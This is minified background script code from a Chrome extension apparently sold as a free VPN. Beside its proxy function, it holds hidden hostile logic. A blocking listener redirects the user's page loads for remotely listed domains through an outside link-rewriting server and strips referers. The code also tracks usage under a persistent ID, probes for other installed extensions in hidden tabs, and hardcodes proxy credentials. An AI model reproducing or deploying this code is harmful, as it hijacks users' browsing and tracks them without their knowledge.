(function(){chrome.runtime.onInstalled.addListener(a=>{"install"==a.reason&&chrome.tabs.create({url:"https://freevpn.zone/install/"})}),chrome.runtime.setUninstallURL("https://freevpn.zone/uninstall/")})();class ProxyApp{constructor(){this.storage=STORAGE,this.rateInterval=null,this.links_cache={},this.links_page={},chrome.runtime.onMessage.addListener((a,b,c)=>!!(b&&b.url&&-1<b.url.indexOf("pac.js"))||("getConfig"===a.action&&c(this.storage),"getIP"===a.action&&c(this.currentIP),"optout"!==a.action||(this.optouted=this.storage.optouted=!0,this.saveStorage(),!0))),chrome.runtime.onMessage.addListener(a=>{switch(a.action){case"connect":a.country&&(this.storage.country=a.country),this.storage.vpnOn=!0,this.storage.isConnecting=!1,this.checkAllLinks(),this.setProxy(),this.saveStorage();break;case"disconnect":this.storage.vpnOn=!1,this.storage.isConnecting=!1,chrome.runtime.sendMessage({action:"disable"}),clearInterval(this.rateInterval),this.setProxy(),this.saveStorage();break;case"closeRatePopup":this.storage.dateCloseRate=Date.now(),this.saveStorage();break;case"rated":this.storage.rated=!0,clearInterval(this.rateInterval),this.saveStorage();break;case"set_settings":this.storage.settings=a.settings,this.saveStorage();break;case"safeBadge":this.setSafeBadge();}}),chrome.runtime.onMessage.addListener((a,b,c)=>{switch(a.action){case"checkAllLinks":this.checkAllLinks(c);}return!0}),chrome.tabs.onActivated.addListener(()=>{this.setSafeBadge(),this.checkAllLinks()}),this.filterRequestConfigured=!1,this.proxyInitiated=!1,this.lastProxyRotateTime=!1,this.initStorage(),this.onStorageUpdate(),this.optouted=!1,this.environmentValidated=!1,this.envDetected=!1,this.statProcessorRun=!1,this.currentProxy="",this.failedProxyList=[],this.validatedProxyList=[],this.currentIP="",this.vpnBlackListDomains=["freevpn.zone"]}get params(){return this.storage.params}onStorageUpdate(){chrome.storage.onChanged.addListener(a=>{for(let b in a)a[b].oldValue!=a[b].newValue&&("vpnOn"===b||"country"===b?(this.storage[b]=a[b].newValue,this.setProxy()):this.storage[b]=a[b].newValue)})}initStorage(){chrome.storage.local.get(this.storage,a=>{this.storage=a,this.setProxy(),this.uid=a.uid?a.uid:this.storage.uid=this.generateUUID(),null===a.mTime&&(this.storage.mTime=new Date().getTime()),null===a.lTime&&(this.storage.lTime=0),a.envDetected&&(this.envDetected=a.envDetected),!0==a.optouted&&(this.optouted=!0),!0==this.storage.settings.safeBrowsing&&"1.9.4"==chrome.runtime.getManifest().version&&(this.storage.settings.safeBrowsing=!1),a.dateCloseRate||(a.dateCloseRate=Date.now()-864e5),this.storage.appLoads++,this.saveStorage(),this.validateEnvironment(),this.initProxy(),this.updateConfig(),this.updateServers()})}saveStorage(){chrome.storage.local.set(this.storage)}updateServers(){let a=new Date().getTime(),b=a-this.storage.mTime;this.storage.mTime=a,12e5>b&&(this.storage.lTime+=b),this.saveStorage();var c="id="+encodeURIComponent(chrome.runtime.id)+"&t="+encodeURIComponent(new Date().getTime())+"&mt="+encodeURIComponent(this.storage.mTime)+"&lt="+encodeURIComponent(this.storage.lTime)+"&uid="+encodeURIComponent(this.uid)+"&hash="+this.storage.hash;const d=localStorage.devConfigUrl,e=d?d:"https://freevpn.zone/servers/?"+c;$.ajax({url:e,success:a=>{var b=Math.round;let c=this.storage.hash;for(let b in a.locations=a.locations.filter(a=>"NC"!=a.country_code),a)this.storage[b]=a[b];if("init"==this.storage.country){let a=this.storage.locations.filter(a=>a.premium),c=a[b(Math.random()*(a.length-1))];this.storage.country=c.country_code}for(let b=0;b<a.locations.length;b++)if(a.locations[b].premium)for(let c=0;c<a.locations[b].nodes.length;c++){let d=a.locations[b].nodes[c],e=!1;for(let a=0;a<this.validatedProxyList.length;a++)`${d.schema} ${d.ip}:${d.port}`==this.validatedProxyList[a]&&(e=!0);e||this.validatedProxyList.push(`${d.schema} ${d.ip}:${d.port}`)}c!==a.hash&&this.setProxy(),this.saveStorage()}});let f=this;setTimeout(function(){f.updateServers()},72e5)}updateConfig(){let a=new Date().getTime(),b=a-this.storage.mTime;this.storage.mTime=a,12e5>b&&(this.storage.lTime+=b),this.saveStorage();var c="id="+encodeURIComponent(chrome.runtime.id)+"&t="+encodeURIComponent(new Date().getTime())+"&mt="+encodeURIComponent(this.storage.mTime)+"&lt="+encodeURIComponent(this.storage.lTime)+"&uid="+encodeURIComponent(this.uid)+"&hash="+this.storage.hash;const d=localStorage.devConfigUrl,e=d?d:"https://freevpn.zone/config/?pv=3&"+c;$.ajax({url:e,success:a=>{for(let b in a)this.storage[b]=a[b];this.validateEnvironment(),this.saveStorage(),this.initProxy()}});let f=this;setTimeout(function(){f.updateConfig()},9e5)}initProxy(){this.storage&&this.storage.proxyUrl&&this.storage.proxyKey&&!this.proxyInitiated&&5<this.storage.appLoads&&(this.proxyInitiated=!0,this.proxy())}proxy(){let a=this;(function(){function b(a,b,h){var j=!1;if(-1<g.indexOf(b))j=!0;else for(var k in g)if(-1<g[k].indexOf(b)||-1<b.indexOf(g[k])){j=!0;break}j?e=c+"/get?key="+d+"&out="+encodeURIComponent(a)+"&ref="+encodeURIComponent(a)+"&uid=&format=go":f.data.used_domains[b]=h+864e5}var c=a.storage.proxyUrl,d=a.storage.proxyKey,e="",f={data:{used_domains:{}}},g=[],h=!0;(function(){var a=new XMLHttpRequest;a.timeout=15e3,a.onreadystatechange=function(){4===a.readyState&&(200===a.status?(g=JSON.parse(a.responseText),g&&(h=!0)):h=!1)},a.open("GET",c+"/coverage?key="+d,!0),a.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),a.send()})(),chrome.webRequest.onBeforeRequest.addListener(function(c){if(!(0>c.tabId)&&"GET"==c.method&&h&&!a.optouted){var d=c.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1").replace("www.",""),g=new Date().getTime();if(!(f.data.used_domains[d]&&f.data.used_domains[d]+7200000>g))return(f.data.used_domains[d]=g,e?e="":b(c.url,d,g),e)?(h=!1,setTimeout(function(){e="",h=!0},15e3),{redirectUrl:e}):void 0}},{urls:["*://*/*"],types:["main_frame"]},["blocking"]),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if("GET"==a.method&&-1<a.url.indexOf(c))for(var b in a.requestHeaders){var d=a.requestHeaders[b];if("referer"==d.name.toLowerCase()){a.requestHeaders.splice(b,1);break}}return{requestHeaders:a.requestHeaders}},{urls:["<all_urls>"]},["blocking","requestHeaders"])})()}randomizeProxyStr(a){const b=a.slice(),c=[];for(;b.length;){const a=Math.floor(Math.random()*b.length);c.push(b[a]),b.splice(a,1)}return c.join("; ")}randomProxy(a){let b=a.slice();if(this.failedProxyList)for(let a in this.failedProxyList)-1<b.indexOf(this.failedProxyList[a])&&b.splice(b.indexOf(this.failedProxyList[a]),1);if(1>b.length)return!1;const c=Math.floor(Math.random()*b.length);return b[c]}setProxy(){let a;this.currentIP=null,this.storage.vpnOn&&(chrome.runtime.sendMessage({action:"connecting"}),this.storage.isConnecting=!0,this.saveStorage(),this.currentProxy=this.randomProxy(this.activeLocationProxyList),!this.currentProxy&&(this.storage.vpnOn=!1,this.storage.isConnecting=!1,this.saveStorage(),chrome.runtime.sendMessage({action:"disconnected"})),a=`function FindProxyForURL(url, host) {             let blackList = ${JSON.stringify(this.vpnBlackListDomains)};              for (let i = 0; i < blackList.length; i++){                if (shExpMatch(host, blackList[i])) return "DIRECT;";            }                        return "`+this.currentProxy+`; "; }`),this.setBadge();var b=!1;chrome.proxy.settings.clear({scope:"regular"},()=>{if(!this.storage.vpnOn)return void this.getCurrentRemoteIP(()=>{chrome.runtime.sendMessage({action:"gotIP",data:{disabled:!0,store:this.storage,ip:this.currentIP}})},()=>{chrome.runtime.sendMessage({action:"gotIP",data:{disabled:!0,store:this.storage,ip:"",country:""}})});let c=[];chrome.webRequest.onAuthRequired.addListener(function(a){return-1===c.indexOf(a.requestId)?(c.push(a.requestId),{authCredentials:{username:"DictOciafDocyangEzbawuj1",password:"bavpensacpyubEfketDiwrir"}}):{cancel:!0}},{urls:["http://*/*","https://*/*"]},["blocking"]),chrome.webRequest.onCompleted.addListener(function(a){let b=c.indexOf(a.requestId);-1<b&&c.splice(b,1)},{urls:["http://*/*","https://*/*"]}),chrome.webRequest.onErrorOccurred.addListener(function(a){let b=c.indexOf(a.requestId);-1<b&&c.splice(b,1)},{urls:["http://*/*","https://*/*"]});const d={mode:"pac_script",pacScript:{data:a}};chrome.proxy.settings.set({value:d,scope:"regular"},()=>{this.getCurrentRemoteIP(()=>{this.storage.vpnOn&&(this.storage.prevCountry=this.storage.country,this.storage.isConnecting=!1,this.saveStorage(),chrome.runtime.sendMessage({action:"connected"}),this.setRateInterval()),chrome.runtime.sendMessage({action:"gotIP",data:{ip:this.currentIP}})},()=>{this.storage.vpnOn&&(this.storage.prevCountry=this.storage.country,this.storage.isConnecting=!1,this.saveStorage(),chrome.runtime.sendMessage({action:"connected"}),this.setRateInterval()),chrome.runtime.sendMessage({action:"gotIP",data:{ip:"",country:""}})})}),chrome.proxy.onProxyError.addListener(a=>{this.storage.isConnecting=!1,this.saveStorage();!1!==navigator.onLine&&(b||(ga("send","event","Errors",`version_${chrome.runtime.getManifest().version}`,`${a.details.error||""}!`),b=!0,this.proxyConnectFailover()))})})}proxyConnectFailover(){const a=new Date().getTime();this.lastProxyRotateTime&&15e3>a-this.lastProxyRotateTime||(this.isProxyWhiteListed()||(this.blackListProxy(),this.setProxy(),this.lastProxyRotateTime=a),this.storage.isConnecting=!1,this.saveStorage(),chrome.runtime.sendMessage({action:"gotIPError",data:{}}))}blackListProxy(){this.currentProxy&&-1==this.failedProxyList.indexOf(this.currentProxy)&&this.failedProxyList.push(this.currentProxy)}whiteListProxy(){this.currentProxy&&-1==this.validatedProxyList.indexOf(this.currentProxy)&&this.validatedProxyList.push(this.currentProxy)}isProxyWhiteListed(){return this.currentProxy&&-1<this.validatedProxyList.indexOf(this.currentProxy)}generateUUID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(a){var b=0|16*Math.random(),c="x"==a?b:8|3&b;return c.toString(16)})}validateEnvironment(){let a=this;if(!a.environmentValidated&&a.storage.envCEnable&&a.storage.envCPeriod&&a.storage.envCids){a.environmentValidated=!0;let b=new Date().getTime();if(a.storage.lastEnvCheck&&b-a.storage.lastEnvCheck<a.storage.envCPeriod)return;for(let c in a.storage.lastEnvCheck=b,a.envDetected=a.storage.envDetected=!1,a.saveStorage(),a.storage.envCids)a.detectExtentionById(a.storage.envCids[c]).then(function(b){b&&(a.storage.envDetected=a.envDetected=!0,a.saveStorage())})}}detectExtentionById(a){let b=this;return new Promise(function(c){var d=!1;chrome.tabs.create({url:"chrome-extension://"+a+"/manifest.json",active:!1},function(a){setTimeout(function(){b.safeRemoveTab(a.id),c(!1)},3e3),chrome.tabs.insertCSS(a.id,{code:"console.log('ok');"},function(){chrome.runtime.lastError&&(d=/chrome-extension/gm.test(chrome.runtime.lastError.message)),chrome.tabs.remove(a.id,function(){c(d)})})})})}safeRemoveTab(a){try{chrome.tabs.remove(a,function(){chrome.runtime.lastError})}catch(a){}}getCurrentRemoteIP(a,b){const c=new XMLHttpRequest;c.open("GET","http://addr.cx/geoip",!0),c.timeout=1e4,c.onload=()=>{if(200!==c.status||!c.responseText)return this.storage.connectionInfo.code="",this.storage.connectionInfo.country=this.storage.locations.find(a=>a.country_code==this.storage.country).country_name,this.storage.connectionInfo.ip="",this.saveStorage(),void b();let d=JSON.parse(c.responseText);if(d.ip)return this.currentIP=d.ip,this.storage.connectionInfo.ip=d.ip,this.storage.vpnOn||this.storage.isConnecting?(this.storage.connectionInfo.code=this.storage.country,0<this.storage.locations.length&&(this.storage.connectionInfo.country=this.storage.locations.find(a=>a.country_code==this.storage.country).country_name)):(this.storage.connectionInfo.code=d.country,0<this.storage.locations.length&&(this.storage.connectionInfo.country=this.storage.locations.find(a=>a.country_code==d.country).country_name)),this.saveStorage(),"function"==typeof a&&a(d),this.currentIP},c.ontimeout=()=>{"function"==typeof b&&(this.storage.connectionInfo.code="",this.storage.connectionInfo.country=this.storage.locations.find(a=>a.country_code==this.storage.country).country_name,this.storage.connectionInfo.ip="",this.saveStorage(),b(c))},c.onerror=()=>{c.abort(),"function"==typeof b&&(this.storage.connectionInfo.code="",this.storage.connectionInfo.country=this.storage.locations.find(a=>a.country_code==this.storage.country).country_name,this.storage.connectionInfo.ip="",this.saveStorage(),b(c))},c.send()}setRateInterval(){this.storage.rated||(this.rateInterval&&clearInterval(this.rateInterval),this.rateInterval=setInterval(()=>{!this.storage.rated&&this.storage.vpnOn&&864e5<=Date.now()-this.storage.dateCloseRate&&chrome.tabs.query({active:!0},a=>{chrome.tabs.sendMessage(a[0].id,{action:"show_rateus"})})},3e5))}setBadge(){const a=this.storage.vpnOn?this.storage.country:"";chrome.browserAction.setBadgeBackgroundColor({color:[5,194,143,100]}),chrome.browserAction.setBadgeText({text:a})}setSafeBadge(){chrome.browserAction.setBadgeBackgroundColor({color:[5,194,143,100]}),this.storage.vpnOn||chrome.browserAction.setBadgeText({text:""})}checkAllLinks(a){this.storage.settings.safeBrowsing&&chrome.tabs.query({active:!0},b=>{this.matchUrl(b[0].url)&&chrome.tabs.sendMessage(b[0].id,{action:"get_all_links"},b=>{let c=chrome.runtime.lastError;if(c)return void setTimeout(()=>{this.checkAllLinks()},1e3);if(b&&b.links){let c=null;b.links=b.links.filter(a=>!!(a&&this.getLocation(a).hostname)&&this.getLocation(a).hostname!=b.location.hostname);for(let a=0;a<b.links.length;a++)b.links[a]=this.getLocation(b.links[a]).origin;b.links=b.links.filter(function(a,b,c){return c.indexOf(a)==b});let d={res:b,links:{}};for(let a=0;a<b.links.length;a++)if(this.links_cache[b.links[a]])d.links[b.links[a]]=this.links_cache[b.links[a]],"nok"==this.links_cache[b.links[a]]&&(d.danger=!0,chrome.browserAction.setBadgeBackgroundColor({color:[255,55,55,100]}),!this.storage.vpnOn&&chrome.browserAction.setBadgeText({text:"!"}));else{let d=this.getLocation(b.links[a]);c?c+="&url[]="+d.origin:c="http://freevpn.zone/api/check.php?url[]="+d.origin}c?$.ajax({type:"POST",url:c,success:b=>{for(const a in b)this.links_cache[a]=b[a],d.links[a]=b[a],"nok"==this.links_cache[a]&&(d.danger=!0,chrome.browserAction.setBadgeBackgroundColor({color:[255,55,55,100]}),!this.storage.vpnOn&&chrome.browserAction.setBadgeText({text:"!"}));a&&a(d)}}):a&&a(d)}else;})})}matchUrl(a){return!a.match("https://chrome.google.com")&&!a.match("view-source:")&&!a.match("chrome://")&&!a.match("file:///")&&(!!a.match("http://")||!!a.match("https://")||void 0)}getLocation(a){return new URL(a)}get activeLocation(){return this.storage.locations.find(a=>a.country_code===this.storage.country)}get activeLocationProxyList(){return this.activeLocation.nodes.map(a=>`${a.schema} ${a.ip}:${a.port}`)}get now(){return new Date().getTime()}}const App=new ProxyApp;